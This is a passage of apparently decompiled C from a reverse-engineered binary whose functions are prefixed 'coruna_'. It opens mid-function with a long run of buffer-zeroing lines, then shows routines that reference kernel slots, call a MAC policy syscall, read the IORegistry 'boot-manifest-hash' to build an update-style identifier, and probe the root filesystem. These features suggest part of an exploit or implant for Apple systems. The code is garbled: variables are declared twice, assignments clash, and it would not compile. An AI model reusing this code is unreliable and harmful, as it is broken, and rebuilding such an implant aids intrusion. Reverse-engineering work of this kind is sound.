  scratch[0x224] = '\0';
  scratch[0x225] = '\0';
  scratch[0x226] = '\0';
  scratch[0x227] = '\0';
  scratch[0x238] = '\0';
  scratch[0x239] = '\0';
  scratch[0x23a] = '\0';
  scratch[0x23b] = '\0';
  scratch[0x23c] = '\0';
  scratch[0x23d] = '\0';
  scratch[0x23e] = '\0';
  scratch[0x23f] = '\0';
  scratch[0x230] = '\0';
  scratch[0x231] = '\0';
  scratch[0x232] = '\0';
  scratch[0x233] = '\0';
  scratch[0x234] = '\0';
  scratch[0x235] = '\0';
  scratch[0x236] = '\0';
  scratch[0x237] = '\0';
  scratch[0x208] = '\0';
  scratch[0x209] = '\0';
  scratch[0x20a] = '\0';
  scratch[0x20b] = '\0';
  scratch[0x20c] = '\0';
  scratch[0x20d] = '\0';
  scratch[0x20e] = '\0';
  scratch[0x20f] = '\0';
  scratch[0x200] = '\0';
  scratch[0x201] = '\0';
  scratch[0x202] = '\0';
  scratch[0x203] = '\0';
  scratch[0x204] = '\0';
  scratch[0x205] = '\0';
  scratch[0x206] = '\0';
  scratch[0x207] = '\0';
  scratch[0x218] = '\0';
  scratch[0x219] = '\0';
  scratch[0x21a] = '\0';
  scratch[0x21b] = '\0';
  scratch[0x21c] = '\0';
  scratch[0x21d] = '\0';
  scratch[0x21e] = '\0';
  scratch[0x21f] = '\0';
  scratch[0x210] = '\0';
  scratch[0x211] = '\0';
  scratch[0x212] = '\0';
  scratch[0x213] = '\0';
  scratch[0x214] = '\0';
  scratch[0x215] = '\0';
  scratch[0x216] = '\0';
  scratch[0x217] = '\0';
  scratch[0x1e8] = '\0';
  scratch[0x1e9] = '\0';
  scratch[0x1ea] = '\0';
  scratch[0x1eb] = '\0';
  scratch[0x1ec] = '\0';
  scratch[0x1ed] = '\0';
  scratch[0x1ee] = '\0';
  scratch[0x1ef] = '\0';
  scratch[0x1e0] = '\0';
  scratch[0x1e1] = '\0';
  scratch[0x1e2] = '\0';
  scratch[0x1e3] = '\0';
  scratch[0x1e4] = '\0';
  scratch[0x1e5] = '\0';
  scratch[0x1e6] = '\0';
  scratch[0x1e7] = '\0';
  scratch[0x1f8] = '\0';
  scratch[0x1f9] = '\0';
  scratch[0x1fa] = '\0';
  scratch[0x1fb] = '\0';
  scratch[0x1fc] = '\0';
  scratch[0x1fd] = '\0';
  scratch[0x1fe] = '\0';
  scratch[0x1ff] = '\0';
  scratch[0x1f0] = '\0';
  scratch[0x1f1] = '\0';
  scratch[0x1f2] = '\0';
  scratch[499] = '\0';
  scratch[500] = '\0';
  scratch[0x1f5] = '\0';
  scratch[0x1f6] = '\0';
  scratch[0x1f7] = '\0';
  scratch[0x1c8] = '\0';
  scratch[0x1c9] = '\0';
  scratch[0x1ca] = '\0';
  scratch[0x1cb] = '\0';
  scratch[0x1cc] = '\0';
  scratch[0x1cd] = '\0';
  scratch[0x1ce] = '\0';
  scratch[0x1cf] = '\0';
  scratch[0x1c0] = '\0';
  scratch[0x1c1] = '\0';
  scratch[0x1c2] = '\0';
  scratch[0x1c3] = '\0';
  scratch[0x1c4] = '\0';
  scratch[0x1c5] = '\0';
  scratch[0x1c6] = '\0';
  scratch[0x1c7] = '\0';
  scratch[0x1d8] = '\0';
  scratch[0x1d9] = '\0';
  scratch[0x1da] = '\0';
  scratch[0x1db] = '\0';
  scratch[0x1dc] = '\0';
  scratch[0x1dd] = '\0';
  scratch[0x1de] = '\0';
  scratch[0x1df] = '\0';
  scratch[0x1d0] = '\0';
  scratch[0x1d1] = '\0';
  scratch[0x1d2] = '\0';
  scratch[0x1d3] = '\0';
  scratch[0x1d4] = '\0';
  scratch[0x1d5] = '\0';
  scratch[0x1d6] = '\0';
  scratch[0x1d7] = '\0';
  scratch[0x1a8] = '\0';
  scratch[0x1a9] = '\0';
  scratch[0x1aa] = '\0';
  scratch[0x1ab] = '\0';
  scratch[0x1ac] = '\0';
  scratch[0x1ad] = '\0';
  scratch[0x1ae] = '\0';
  scratch[0x1af] = '\0';
  scratch[0x1a0] = '\0';
  scratch[0x1a1] = '\0';
  scratch[0x1a2] = '\0';
  scratch[0x1a3] = '\0';
  scratch[0x1a4] = '\0';
  scratch[0x1a5] = '\0';
  scratch[0x1a6] = '\0';
  scratch[0x1a7] = '\0';
  scratch[0x1b8] = '\0';
  scratch[0x1b9] = '\0';
  scratch[0x1ba] = '\0';
  scratch[0x1bb] = '\0';
  scratch[0x1bc] = '\0';
  scratch[0x1bd] = '\0';
  scratch[0x1be] = '\0';
  scratch[0x1bf] = '\0';
  scratch[0x1b0] = '\0';
  scratch[0x1b1] = '\0';
  scratch[0x1b2] = '\0';
  scratch[0x1b3] = '\0';
  scratch[0x1b4] = '\0';
  scratch[0x1b5] = '\0';
  scratch[0x1b6] = '\0';
  scratch[0x1b7] = '\0';
  scratch[0x188] = '\0';
  scratch[0x189] = '\0';
  scratch[0x18a] = '\0';
  scratch[0x18b] = '\0';
  scratch[0x18c] = '\0';
  scratch[0x18d] = '\0';
  scratch[0x18e] = '\0';
  scratch[399] = '\0';
  scratch[0x180] = '\0';
  scratch[0x181] = '\0';
  scratch[0x182] = '\0';
  scratch[0x183] = '\0';
  scratch[0x184] = '\0';
  scratch[0x185] = '\0';
  scratch[0x186] = '\0';
  scratch[0x187] = '\0';
  scratch[0x198] = '\0';
  scratch[0x199] = '\0';
  scratch[0x19a] = '\0';
  scratch[0x19b] = '\0';
  scratch[0x19c] = '\0';
  scratch[0x19d] = '\0';
  scratch[0x19e] = '\0';
  scratch[0x19f] = '\0';
  scratch[400] = '\0';
  scratch[0x191] = '\0';
  scratch[0x192] = '\0';
  scratch[0x193] = '\0';
  scratch[0x194] = '\0';
  scratch[0x195] = '\0';
  scratch[0x196] = '\0';
  scratch[0x197] = '\0';
  scratch[0x168] = '\0';
  scratch[0x169] = '\0';
  scratch[0x16a] = '\0';
  scratch[0x16b] = '\0';
  scratch[0x16c] = '\0';
  scratch[0x16d] = '\0';
  scratch[0x16e] = '\0';
  scratch[0x16f] = '\0';
  scratch[0x160] = '\0';
  scratch[0x161] = '\0';
  scratch[0x162] = '\0';
  scratch[0x163] = '\0';
  scratch[0x164] = '\0';
  scratch[0x165] = '\0';
  scratch[0x166] = '\0';
  scratch[0x167] = '\0';
  scratch[0x178] = '\0';
  scratch[0x179] = '\0';
  scratch[0x17a] = '\0';
  scratch[0x17b] = '\0';
  scratch[0x17c] = '\0';
  scratch[0x17d] = '\0';
  scratch[0x17e] = '\0';
  scratch[0x17f] = '\0';
  scratch[0x170] = '\0';
  scratch[0x171] = '\0';
  scratch[0x172] = '\0';
  scratch[0x173] = '\0';
  scratch[0x174] = '\0';
  scratch[0x175] = '\0';
  scratch[0x176] = '\0';
  scratch[0x177] = '\0';
  scratch[0x148] = '\0';
  scratch[0x149] = '\0';
  scratch[0x14a] = '\0';
  scratch[0x14b] = '\0';
  scratch[0x14c] = '\0';
  scratch[0x14d] = '\0';
  scratch[0x14e] = '\0';
  scratch[0x14f] = '\0';
  scratch[0x140] = '\0';
  scratch[0x141] = '\0';
  scratch[0x142] = '\0';
  scratch[0x143] = '\0';
  scratch[0x144] = '\0';
  scratch[0x145] = '\0';
  scratch[0x146] = '\0';
  scratch[0x147] = '\0';
  scratch[0x158] = '\0';
  scratch[0x159] = '\0';
  scratch[0x15a] = '\0';
  scratch[0x15b] = '\0';
  scratch[0x15c] = '\0';
  scratch[0x15d] = '\0';
  scratch[0x15e] = '\0';
  scratch[0x15f] = '\0';
  scratch[0x150] = '\0';
  scratch[0x151] = '\0';
  scratch[0x152] = '\0';
  scratch[0x153] = '\0';
  scratch[0x154] = '\0';
  scratch[0x155] = '\0';
  scratch[0x156] = '\0';
  scratch[0x157] = '\0';
  scratch[0x128] = '\0';
  scratch[0x129] = '\0';
  scratch[0x12a] = '\0';
  scratch[299] = '\0';
  scratch[300] = '\0';
  scratch[0x12d] = '\0';
  scratch[0x12e] = '\0';
  scratch[0x12f] = '\0';
  scratch[0x120] = '\0';
  scratch[0x121] = '\0';
  scratch[0x122] = '\0';
  scratch[0x123] = '\0';
  scratch[0x124] = '\0';
  scratch[0x125] = '\0';
  scratch[0x126] = '\0';
  scratch[0x127] = '\0';
  scratch[0x138] = '\0';
  scratch[0x139] = '\0';
  scratch[0x13a] = '\0';
  scratch[0x13b] = '\0';
  scratch[0x13c] = '\0';
  scratch[0x13d] = '\0';
  scratch[0x13e] = '\0';
  scratch[0x13f] = '\0';
  scratch[0x130] = '\0';
  scratch[0x131] = '\0';
  scratch[0x132] = '\0';
  scratch[0x133] = '\0';
  scratch[0x134] = '\0';
  scratch[0x135] = '\0';
  scratch[0x136] = '\0';
  scratch[0x137] = '\0';
  scratch[0x108] = '\0';
  scratch[0x109] = '\0';
  scratch[0x10a] = '\0';
  scratch[0x10b] = '\0';
  scratch[0x10c] = '\0';
  scratch[0x10d] = '\0';
  scratch[0x10e] = '\0';
  scratch[0x10f] = '\0';
  scratch[0x100] = '\0';
  scratch[0x101] = '\0';
  scratch[0x102] = '\0';
  scratch[0x103] = '\0';
  scratch[0x104] = '\0';
  scratch[0x105] = '\0';
  scratch[0x106] = '\0';
  scratch[0x107] = '\0';
  scratch[0x118] = '\0';
  scratch[0x119] = '\0';
  scratch[0x11a] = '\0';
  scratch[0x11b] = '\0';
  scratch[0x11c] = '\0';
  scratch[0x11d] = '\0';
  scratch[0x11e] = '\0';
  scratch[0x11f] = '\0';
  scratch[0x110] = '\0';
  scratch[0x111] = '\0';
  scratch[0x112] = '\0';
  scratch[0x113] = '\0';
  scratch[0x114] = '\0';
  scratch[0x115] = '\0';
  scratch[0x116] = '\0';
  scratch[0x117] = '\0';
  scratch[0xe8] = '\0';
  scratch[0xe9] = '\0';
  scratch[0xea] = '\0';
  scratch[0xeb] = '\0';
  scratch[0xec] = '\0';
  scratch[0xed] = '\0';
  scratch[0xee] = '\0';
  scratch[0xef] = '\0';
  scratch[0xe0] = '\0';
  scratch[0xe1] = '\0';
  scratch[0xe2] = '\0';
  scratch[0xe3] = '\0';
  scratch[0xe4] = '\0';
  scratch[0xe5] = '\0';
  scratch[0xe6] = '\0';
  scratch[0xe7] = '\0';
  scratch[0xf8] = '\0';
  scratch[0xf9] = '\0';
  scratch[0xfa] = '\0';
  scratch[0xfb] = '\0';
  scratch[0xfc] = '\0';
  scratch[0xfd] = '\0';
  scratch[0xfe] = '\0';
  scratch[0xff] = '\0';
  scratch[0xf0] = '\0';
  scratch[0xf1] = '\0';
  scratch[0xf2] = '\0';
  scratch[0xf3] = '\0';
  scratch[0xf4] = '\0';
  scratch[0xf5] = '\0';
  scratch[0xf6] = '\0';
  scratch[0xf7] = '\0';
  scratch[200] = '\0';
  scratch[0xc9] = '\0';
  scratch[0xca] = '\0';
  scratch[0xcb] = '\0';
  scratch[0xcc] = '\0';
  scratch[0xcd] = '\0';
  scratch[0xce] = '\0';
  scratch[0xcf] = '\0';
  scratch[0xc0] = '\0';
  scratch[0xc1] = '\0';
  scratch[0xc2] = '\0';
  scratch[0xc3] = '\0';
  scratch[0xc4] = '\0';
  scratch[0xc5] = '\0';
  scratch[0xc6] = '\0';
  scratch[199] = '\0';
  scratch[0xd8] = '\0';
  scratch[0xd9] = '\0';
  scratch[0xda] = '\0';
  scratch[0xdb] = '\0';
  scratch[0xdc] = '\0';
  scratch[0xdd] = '\0';
  scratch[0xde] = '\0';
  scratch[0xdf] = '\0';
  scratch[0xd0] = '\0';
  scratch[0xd1] = '\0';
  scratch[0xd2] = '\0';
  scratch[0xd3] = '\0';
  scratch[0xd4] = '\0';
  scratch[0xd5] = '\0';
  scratch[0xd6] = '\0';
  scratch[0xd7] = '\0';
  scratch[0xa8] = '\0';
  scratch[0xa9] = '\0';
  scratch[0xaa] = '\0';
  scratch[0xab] = '\0';
  scratch[0xac] = '\0';
  scratch[0xad] = '\0';
  scratch[0xae] = '\0';
  scratch[0xaf] = '\0';
  scratch[0xa0] = '\0';
  scratch[0xa1] = '\0';
  scratch[0xa2] = '\0';
  scratch[0xa3] = '\0';
  scratch[0xa4] = '\0';
  scratch[0xa5] = '\0';
  scratch[0xa6] = '\0';
  scratch[0xa7] = '\0';
  scratch[0xb8] = '\0';
  scratch[0xb9] = '\0';
  scratch[0xba] = '\0';
  scratch[0xbb] = '\0';
  scratch[0xbc] = '\0';
  scratch[0xbd] = '\0';
  scratch[0xbe] = '\0';
  scratch[0xbf] = '\0';
  scratch[0xb0] = '\0';
  scratch[0xb1] = '\0';
  scratch[0xb2] = '\0';
  scratch[0xb3] = '\0';
  scratch[0xb4] = '\0';
  scratch[0xb5] = '\0';
  scratch[0xb6] = '\0';
  scratch[0xb7] = '\0';
  scratch[0x88] = '\0';
  scratch[0x89] = '\0';
  scratch[0x8a] = '\0';
  scratch[0x8b] = '\0';
  scratch[0x8c] = '\0';
  scratch[0x8d] = '\0';
  scratch[0x8e] = '\0';
  scratch[0x8f] = '\0';
  scratch[0x80] = '\0';
  scratch[0x81] = '\0';
  scratch[0x82] = '\0';
  scratch[0x83] = '\0';
  scratch[0x84] = '\0';
  scratch[0x85] = '\0';
  scratch[0x86] = '\0';
  scratch[0x87] = '\0';
  scratch[0x98] = '\0';
  scratch[0x99] = '\0';
  scratch[0x9a] = '\0';
  scratch[0x9b] = '\0';
  scratch[0x9c] = '\0';
  scratch[0x9d] = '\0';
  scratch[0x9e] = '\0';
  scratch[0x9f] = '\0';
  scratch[0x90] = '\0';
  scratch[0x91] = '\0';
  scratch[0x92] = '\0';
  scratch[0x93] = '\0';
  scratch[0x94] = '\0';
  scratch[0x95] = '\0';
  scratch[0x96] = '\0';
  scratch[0x97] = '\0';
  scratch[0x68] = '\0';
  scratch[0x69] = '\0';
  scratch[0x6a] = '\0';
  scratch[0x6b] = '\0';
  scratch[0x6c] = '\0';
  scratch[0x6d] = '\0';
  scratch[0x6e] = '\0';
  scratch[0x6f] = '\0';
  scratch[0x60] = '\0';
  scratch[0x61] = '\0';
  scratch[0x62] = '\0';
  scratch[99] = '\0';
  scratch[100] = '\0';
  scratch[0x65] = '\0';
  scratch[0x66] = '\0';
  scratch[0x67] = '\0';
  scratch[0x78] = '\0';
  scratch[0x79] = '\0';
  scratch[0x7a] = '\0';
  scratch[0x7b] = '\0';
  scratch[0x7c] = '\0';
  scratch[0x7d] = '\0';
  scratch[0x7e] = '\0';
  scratch[0x7f] = '\0';
  scratch[0x70] = '\0';
  scratch[0x71] = '\0';
  scratch[0x72] = '\0';
  scratch[0x73] = '\0';
  scratch[0x74] = '\0';
  scratch[0x75] = '\0';
  scratch[0x76] = '\0';
  scratch[0x77] = '\0';
  scratch[0x48] = '\0';
  scratch[0x49] = '\0';
  scratch[0x4a] = '\0';
  scratch[0x4b] = '\0';
  scratch[0x4c] = '\0';
  scratch[0x4d] = '\0';
  scratch[0x4e] = '\0';
  scratch[0x4f] = '\0';
  scratch[0x40] = '\0';
  scratch[0x41] = '\0';
  scratch[0x42] = '\0';
  scratch[0x43] = '\0';
  scratch[0x44] = '\0';
  scratch[0x45] = '\0';
  scratch[0x46] = '\0';
  scratch[0x47] = '\0';
  scratch[0x58] = '\0';
  scratch[0x59] = '\0';
  scratch[0x5a] = '\0';
  scratch[0x5b] = '\0';
  scratch[0x5c] = '\0';
  scratch[0x5d] = '\0';
  scratch[0x5e] = '\0';
  scratch[0x5f] = '\0';
  scratch[0x50] = '\0';
  scratch[0x51] = '\0';
  scratch[0x52] = '\0';
  scratch[0x53] = '\0';
  scratch[0x54] = '\0';
  scratch[0x55] = '\0';
  scratch[0x56] = '\0';
  scratch[0x57] = '\0';
  scratch[0x28] = '\0';
  scratch[0x29] = '\0';
  scratch[0x2a] = '\0';
  scratch[0x2b] = '\0';
  scratch[0x2c] = '\0';
  scratch[0x2d] = '\0';
  scratch[0x2e] = '\0';
  scratch[0x2f] = '\0';
  scratch[0x20] = '\0';
  scratch[0x21] = '\0';
  scratch[0x22] = '\0';
  scratch[0x23] = '\0';
  scratch[0x24] = '\0';
  scratch[0x25] = '\0';
  scratch[0x26] = '\0';
  scratch[0x27] = '\0';
  scratch[0x38] = '\0';
  scratch[0x39] = '\0';
  scratch[0x3a] = '\0';
  scratch[0x3b] = '\0';
  scratch[0x3c] = '\0';
  scratch[0x3d] = '\0';
  scratch[0x3e] = '\0';
  scratch[0x3f] = '\0';
  scratch[0x30] = '\0';
  scratch[0x31] = '\0';
  scratch[0x32] = '\0';
  scratch[0x33] = '\0';
  scratch[0x34] = '\0';
  scratch[0x35] = '\0';
  scratch[0x36] = '\0';
  scratch[0x37] = '\0';
  scratch[8] = '\0';
  scratch[9] = '\0';
  scratch[10] = '\0';
  scratch[0xb] = '\0';
  scratch[0xc] = '\0';
  scratch[0xd] = '\0';
  scratch[0xe] = '\0';
  scratch[0xf] = '\0';
  scratch[0] = '\0';
  scratch[1] = '\0';
  scratch[2] = '\0';
  scratch[3] = '\0';
  scratch[4] = '\0';
  scratch[5] = '\0';
  scratch[6] = '\0';
  scratch[7] = '\0';
  scratch[0x18] = '\0';
  scratch[0x19] = '\0';
  scratch[0x1a] = '\0';
  scratch[0x1b] = '\0';
  scratch[0x1c] = '\0';
  scratch[0x1d] = '\0';
  scratch[0x1e] = '\0';
  scratch[0x1f] = '\0';
  scratch[0x10] = '\0';
  scratch[0x11] = '\0';
  scratch[0x12] = '\0';
  scratch[0x13] = '\0';
  scratch[0x14] = '\0';
  scratch[0x15] = '\0';
  scratch[0x16] = '\0';
  scratch[0x17] = '\0';
  size = _IORegistryEntryFromPath
                    (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IODeviceTree:/chosen");
  if ((int)size == 0) {
    port = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return port;
    }
    ___stack_chk_fail();
  }
  port = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(port,"boot-manifest-hash",0x8000100);
  if (handle == 0) {
    port = 0;
  }
  else {
    addr = _IORegistryEntryCreateCFProperty(size,handle,port,0);
    if (addr == 0) {
      port = 0;
    }
    else {
      off = _CFDataGetTypeID();
      base = _CFGetTypeID(addr);
      if (off == base) {
        version = _CFDataGetLength(addr);
        ptr = (byte *)_CFDataGetBytePtr(addr);
        if (0x7e < version - 1) goto done;
        ptr = scratch + 0x200;
        do {
          err = *ptr;
          *ptr = "0123456789ABCDEF"[(unsigned long)((err ^ size) >> 4) & 0xf];
          ptr[1] = "0123456789ABCDEF"[(unsigned long)(err ^ size) & 0xf];
          ptr = ptr + 2;
          u = (int)version - 1;
          version = (unsigned long)u;
          ptr = ptr + 1;
        } while (u != 0);
        _snprintf(scratch,0x200,"com.apple.os.update-%s");
        ptr = _strdup(scratch);
        if (ptr == (char *)0x0) goto done;
        *val = ptr;
        port = 1;
      }
      else {
done:
        port = 0;
      }
      _CFRelease(addr);
    }
    _CFRelease(handle);
  }
  _IOObjectRelease(size);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return port;
  }
  ___stack_chk_fail();
}





unsigned long coruna_call_mac_syscall_35844(void)

{
  unsigned long type_id_21;
  int *status;
  
  type_id_21 = coruna_mac_syscall_35844(0xff,0,0,0,0,0);
  if ((int)type_id_21 != 0) {
    status = ___error();
    type_id_21 = (unsigned long)(*status != 1);
  }
  return type_id_21;
}
uint64_t coruna_return_zero_18da4(char *path,long *handle,uint *size)
{
  int err;
  uint u;
  uint *ptr;
  void *ptr;
  uint64_t size;
  unsigned long version;
  uint *buf;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_00037520;
  scratch = k_kernel_rodata_word_37518;
  bootargs = k_kernel_rodata_word_37528;
  *size = 0;
  err = coruna_getattrlist();
  if (err == 0) {
    return 0;
  }
  err = _open(path,0x100000);
  if (err < 0) {
    return 0;
  }
  ptr = _calloc(0x1000,1);
  if (ptr != (uint *)0x0) {
    u = coruna_mac_syscall(err,&scratch,ptr,0x1000,0x40);
    if (-1 < (int)u) {
      *size = u;
      ptr = _calloc((unsigned long)u,8);
      *handle = (long)ptr;
      if (ptr != (void *)0x0) {
        if (u != 0) {
          version = 0;
          buf = ptr;
          do {
            if ((buf[1] & 1) == 0) {
              *(uint64_t *)(*handle + version * 8) = 0;
            }
            else {
              ptr = _calloc((unsigned long)buf[7],1);
              *(void **)(*handle + version * 8) = ptr;
              _strcpy(*(char **)(*handle + version * 8),(char *)(buf + 8));
              u = *size;
            }
            buf = (uint *)((long)buf + (unsigned long)*buf);
            version = version + 1;
          } while (version < u);
        }
        size = 1;
        if (0 < err) {
        _close(err);
        }
        if (ptr != (uint *)0x0) {
        _free(ptr);
        }
        return size;
      }
    }
  }
  size = 0;
fail:
  if (0 < err) {
    _close(err);
  }
  if (ptr != (uint *)0x0) {
    _free(ptr);
  }
  return size;
}





bool coruna_getattrlist(char *path)
{
  int err;
  uint64_t scratch;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint32_t thread_attr;
  uint32_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  
  action = 0;
  stack_guard = 0;
  block_ctx = 0;
  host_info = 0;
  bootargs = 0;
  action = 0;
  thread_attr = 0;
  serial_buf = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  host_info = 5;
  serial_buf = 0x80020000;
  err = _getattrlist(path,&host_info,&scratch,0x4c,0x20);
  return err != 0 || (scratch & 0x20000) != 0;
}





byte coruna_kernel29478_via_ioregistryentrycreatecfproperty_18b50(char *path,char *str_2,unsigned long arg)
{
  char *ptr;
  char *buf;
  unsigned long u;
  bool err;
  bool status;
  int err;
  int status;
  byte flags;
  unsigned long size;
  uint64_t *ptr;
  char *str;
  unsigned long version;
  uint64_t *buf;
  char *scratch;
  char *bootargs;
  uint thread_attr;
  uint64_t *host_info;
  
  host_info = (uint64_t *)0x0;
  thread_attr = 0;
  scratch = (char *)0x0;
  bootargs = (char *)0x0;
  err = coruna_ioregistryentrycreatecfproperty_18b50(&bootargs,0);
  if (((err == 0) || (err = coruna_ioregistryentrycreatecfproperty_18b50(&scratch,0x41), err == 0)) ||
     (err = coruna_return_zero_18da4(path,&host_info,&thread_attr), err == 0)) {
    flags = 0;
    err = -1;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  err = _open(path,0x100000);
  buf = host_info;
  buf = bootargs;
  if (err < 0) {
    flags = 0;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  version = (unsigned long)thread_attr;
  if (thread_attr == 0) {
    err = false;
    status = false;
    flags = err | status;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  status = _strcmp((char *)*host_info,bootargs);
  if (status == 0) {
    status = false;
    err = true;
  }
  else {
    u = 1;
    do {
      size = u;
      ptr = scratch;
      if (version == size) {
        err = size < version;
        goto cleanup;
      }
      status = _strcmp((char *)buf[size],buf);
      u = size + 1;
    } while (status != 0);
    status = false;
    err = size < version;
  }
  flags = err | status;
  buf = host_info;
  version = (unsigned long)thread_attr;
  ptr = host_info;
  if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
  do {
  _free((void *)*ptr);
  version = version - 1;
  ptr = ptr + 1;
  } while (version != 0);
  _free(buf);
  }
  if (bootargs != (char *)0x0) {
  _free(bootargs);
  }
  if (scratch != (char *)0x0) {
  _free(scratch);
  }
  if (0 < err) {
  _close(err);
  }
  return flags;
}





byte coruna_kernel29478_via_ioregistryentrycreatecfproperty_18b50_2(char *path,char *str_2)
{
  char *ptr;
  bool err;
  int err;
  int status;
  byte status;
  char *buf;
  char *str;
  unsigned long u;
  unsigned long size;
  uint64_t *ptr;
  uint64_t *buf;
  char *scratch;
  char *bootargs;
  uint thread_attr;
  uint64_t *host_info;
  
  host_info = (uint64_t *)0x0;
  thread_attr = 0;
  scratch = (char *)0x0;
  bootargs = (char *)0x0;
  err = coruna_ioregistryentrycreatecfproperty_18b50(&bootargs,0);
  if (((err == 0) || (err = coruna_ioregistryentrycreatecfproperty_18b50(&scratch,0x41), err == 0)) ||
     (err = coruna_return_zero_18da4(path,&host_info,&thread_attr), err == 0)) {
    status = 0;
    err = -1;
  }
  else {
    err = _open(path,0x100000);
    buf = host_info;
    ptr = scratch;
    if (err < 0) {
      status = 0;
    }
    else {
      size = (unsigned long)thread_attr;
      u = size;
      ptr = host_info;
      if (thread_attr != 0) {
        do {
          buf = (char *)*ptr;
          if ((buf != (char *)0x0) &&
             ((status = _strcmp(buf,ptr), status == 0 ||
              ((str_2 != (char *)0x0 && (status = _strcmp(buf,str_2), status == 0)))))) {
            err = false;
            status = 1;
            goto fail;
          }
          buf = bootargs;
          u = u - 1;
          ptr = ptr + 1;
        } while (u != 0);
        do {
          str = (char *)*buf;
          if ((str != (char *)0x0) && (status = _strcmp(str,buf), status == 0)) {
            status = coruna_mac_syscall_35844(3,err,str,ptr,0,0);
            status = 0;
            err = status == 0;
            goto fail;
          }
          buf = buf + 1;
          size = size - 1;
        } while (size != 0);
      }
      status = 0;
      err = false;
fail:
      status = status | err;
    }
  }
  buf = host_info;
  u = (unsigned long)thread_attr;
  ptr = host_info;
  if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
      if ((void *)*ptr != (void *)0x0) {
        _free((void *)*ptr);
      }
      u = u - 1;
      ptr = ptr + 1;
    } while (u != 0);
    _free(buf);
  }
  if (0 < err) {
    _close(err);
  }
  if (bootargs != (char *)0x0) {
    _free(bootargs);
  }
  if (scratch != (char *)0x0) {
    _free(scratch);
  }
  return status;
}





void coruna_statfs_19324(long handle)
{
  int err;
  unsigned long u;
  char *ptr;
  char scratch [2];
  statfs bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = '/';
  scratch[1] = '\0';
  _bzero(&bootargs,0x878);
  u = coruna_getattrlist(scratch);
  if ((int)u != 0) {
    err = _statfs(scratch,&bootargs);
    if (err == 0) {
      u = (unsigned long)(bootargs.f_fsid.val[0] != '\x01');
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_helper_10260_193e0(void)
{
  return;
}





unsigned long coruna_kernel600c_via_ctx_test_flag_6(long arg,unsigned long val)

{
  int status;
  
  if ((val != 0) && ((val >> 0x37 & 1) != 0)) {
    status = coruna_ctx_test_flag(arg,8);
    if ((status == 0) &&
       ((status = coruna_ctx_test_flag(arg,0x5000000), status == 0 ||
        (*(unsigned long *)(arg + 0x158) < 0x22580a06c00000)))) {
      val = val | 0xffffff8000000000;
    }
    else {
      val = val | 0xffff800000000000;
    }
  }
  return val;
}





uint64_t coruna_mach_absolute_time_199bc(long handle,int flags)
{
  unsigned long u;
  int err;
  uint64_t size;
  long handle;
  
  if (flags == 0) {
    coruna_slot_clear(handle,4);
  }
  else {
    if (((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) &&
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x150), handle != 0)) {
      size = _mach_absolute_time();
      u = 0;
      if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
        u = ((size - handle) * (unsigned long)*(uint *)(handle + 0x25c)) /
                (unsigned long)*(uint *)(handle + 0x260);
      }
      if (u < 20000000) {
        coruna_semaphore_timedwait(handle,(0x14 - (int)((u & 0xffffffff) / 1000000)) * 1000);
      }
    }
    err = coruna_mach_absolute_time_1c000(handle,4,1000);
    if (err != 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      size = _mach_absolute_time();
      *(uint64_t *)(*(long *)(handle + 0x118) + 0x150) = size;
    }
  }
  return 1;
}





uint64_t coruna_mach_absolute_time_1f9f8(uint64_t val)
{
  unsigned long u;
  bool err;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  long addr;
  uint32_t tag;
  uint64_t kind;
  double ld11;
  double ld12;
  unsigned long type_id;
  long scratch [7];
  mach_timebase_info_t bootargs;
  
  bootargs.numer = 0;
  bootargs.denom = 0;
  _mach_timebase_info(&bootargs);
  type_id = (unsigned long)bootargs & 0xffffffff;
  u = (unsigned long)bootargs >> 0x20;
  size = _mach_absolute_time();
  err = coruna_ctx_test_flag(val,0x1000000);
  if (err == 0) {
    err = coruna_ctx_test_flag(val,0x100000);
    if (err == 0) {
